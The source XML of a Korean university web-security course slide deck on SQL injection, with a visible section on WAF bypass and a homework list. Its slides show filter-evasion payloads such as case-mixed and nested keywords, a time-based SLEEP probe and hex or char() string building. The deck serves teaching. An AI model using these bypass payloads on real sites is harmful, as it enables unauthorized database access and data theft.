              <a:t>selECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>SlEep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(5) #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String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>치환</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>UNunionION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>SELselectECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> 1,2 –</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=&gt; UNION SELECT 1,2 --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CB2-D63A-4AA3-84F6-355FA24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51913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68758-8372-4B26-AD76-B171F221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 Bypass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095C-53EF-4814-99AB-21EC6862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키워드 필터링</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/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substr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>', 1, 1); # "a"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT mid('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>', 1, 1);    # "a"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>lpad</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>', 1, 1);   # "a“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Ex)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT reverse('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>nimda</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>'), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>adm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>','in'), x'61646d696e', 0x61646d696e;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CB2-D63A-4AA3-84F6-355FA24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644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68758-8372-4B26-AD76-B171F221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 Bypass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095C-53EF-4814-99AB-21EC6862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연산자 우회</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &gt;, &lt;, XOR, DIV, LIKE, RLIKE, REGEXP, IS, IN, NOT, MATCH, AND, OR, BETWEEN, ISNULL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Whitespace </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>우회</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Ascii 9(Horizontal Tab), 10(Line Feed), 11(Vertical Tab), 12(Form Feed), 13(Carriage Return), 32(Space)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT/**/'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>’;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>select`username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>`,(password)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>from`users`WHERE`username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>`='admin';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CB2-D63A-4AA3-84F6-355FA24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3360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68758-8372-4B26-AD76-B171F221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 Bypass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095C-53EF-4814-99AB-21EC6862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400" dirty="0"/>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" dirty="0"/>
              <a:t> 만들기</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>MYSQL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select 0x6162, 0b110000101100010;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select char(0x61, 0x62);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(char(0x61), char(0x62));</a:t>
            </a:r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PostgreSQL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>chr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(65);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>chr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(65), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>chr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(66));</a:t>
            </a:r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MSSQL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select char(0x61);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(char(0x61), char(0x62));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" dirty="0"/>
              <a:t>SQLITE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select char(0x61);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>select char(0x61)||char(0x62);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CB2-D63A-4AA3-84F6-355FA24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8759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68758-8372-4B26-AD76-B171F221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 Bypass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6095C-53EF-4814-99AB-21EC6862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dirty="0" err="1"/>
              <a:t>SQLlite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문자열 우회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select 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>union values</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(2); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr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BE1CB2-D63A-4AA3-84F6-355FA24F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86464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01864-CA6A-4979-ABFA-4A4207A7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3ECDE1-A275-468C-8840-8DBE76738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0. Same Origin Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 모르고 웹을 논하지 말라</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>!</a:t>
            </a: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따로 제출 안 하셔도 됩니다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브라우저 기본 정책인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SOP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 대해 매우 잘 설명 되어있는 영상이라 꼭 한번 보세요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</a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://www.youtube.com/watch?v=6QV_JpabO7g</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://portswigger.net/web-security/cors/same-origin-policy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1. SQL injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문제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개 풀이</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9454C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https://dreamhack.io/wargame/challenges/24/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://dreamhack.io/wargame/challenges/1/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2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>해외 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Realworld</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 1-day case </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>사례 분석 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개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en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hackerone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solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bugcrowd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또는 구글링을 통해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1day </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>취약점 내용이 공개된 사례를 분석</a:t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취약점 종류는 상관없습니다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ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>언제 발생한 취약점인지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-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Root cause</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 무엇인지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어디에서 공개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되었는지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설명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F56EAB-08BB-4343-B14B-BAEA267A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8621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2132</TotalTime>
  <Words>2766</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>501</Paragraphs>
  <Slides>72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73" baseType="lpstr">
      <vt:lpstr>추억</vt:lpstr>
      <vt:lpstr>Web Security 소수전공</vt:lpstr>
      <vt:lpstr>Today</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>SQL DDL (Data Definition Language)</vt:lpstr>
      <vt:lpstr>SQL DDL (Data Definition Language)</vt:lpstr>
      <vt:lpstr>SQL DML(Data manipulation language)</vt:lpstr>
      <vt:lpstr>SQL DML(Data manipulation language)</vt:lpstr>
      <vt:lpstr>SQL DML(Data manipulation language)</vt:lpstr>
      <vt:lpstr>SQL DML(Data manipulation language)</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>SQL Injection</vt:lpstr>
      <vt:lpstr>SQL Injection 시나리오</vt:lpstr>
      <vt:lpstr>SQL Injection 시나리오</vt:lpstr>
      <vt:lpstr>SQL Injection examples</vt:lpstr>
      <vt:lpstr>Retrieving hidden data</vt:lpstr>
      <vt:lpstr>Retrieving hidden data</vt:lpstr>
      <vt:lpstr>Retrieving hidden data</vt:lpstr>
      <vt:lpstr>Retrieving hidden data</vt:lpstr>
      <vt:lpstr>Subverting application logic</vt:lpstr>
      <vt:lpstr>Subverting application logic</vt:lpstr>
      <vt:lpstr>Subverting application logic</vt:lpstr>
      <vt:lpstr>Retrieving data from other database tables</vt:lpstr>
      <vt:lpstr>Retrieving data from other database tables</vt:lpstr>
      <vt:lpstr>Retrieving data from other database tables</vt:lpstr>
      <vt:lpstr>Retrieving data from other database tables</vt:lpstr>
      <vt:lpstr>Examining the database in SQL injection attacks</vt:lpstr>
      <vt:lpstr>Examining the database in SQL injection attacks</vt:lpstr>
      <vt:lpstr>Examining the database in SQL injection attacks</vt:lpstr>
      <vt:lpstr>Examining the database in SQL injection attacks</vt:lpstr>
      <vt:lpstr>Examining the database in SQL injection attacks</vt:lpstr>
      <vt:lpstr>SQL 주석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Determining the number of columns</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Finding columns with a useful data type</vt:lpstr>
      <vt:lpstr>Retrieving multiple values within a single column</vt:lpstr>
      <vt:lpstr>Retrieving multiple values within a single column</vt:lpstr>
      <vt:lpstr>Retrieving multiple values within a single column</vt:lpstr>
      <vt:lpstr>Retrieving multiple values within a single column</vt:lpstr>
      <vt:lpstr>Examining the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Listing the contents of the database</vt:lpstr>
      <vt:lpstr>Equivalent to information schema on Oracle</vt:lpstr>
      <vt:lpstr>Equivalent to information schema on Oracle</vt:lpstr>
      <vt:lpstr>Equivalent to information schema on Oracle</vt:lpstr>
      <vt:lpstr>Equivalent to information schema on Oracle</vt:lpstr>
      <vt:lpstr>Equivalent to information schema on Oracle</vt:lpstr>
      <vt:lpstr>WAF Bypass</vt:lpstr>
      <vt:lpstr>WAF Bypass</vt:lpstr>
      <vt:lpstr>WAF Bypass</vt:lpstr>
      <vt:lpstr>WAF Bypass</vt:lpstr>
      <vt:lpstr>WAF Bypass</vt:lpstr>
      <vt:lpstr>과제</vt:lpstr>
      <vt:lpstr>QnA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13</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-06-24T06:49:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-01-02T07:07:52Z</dcterms:modified>
</cp:coreProperties>
</file>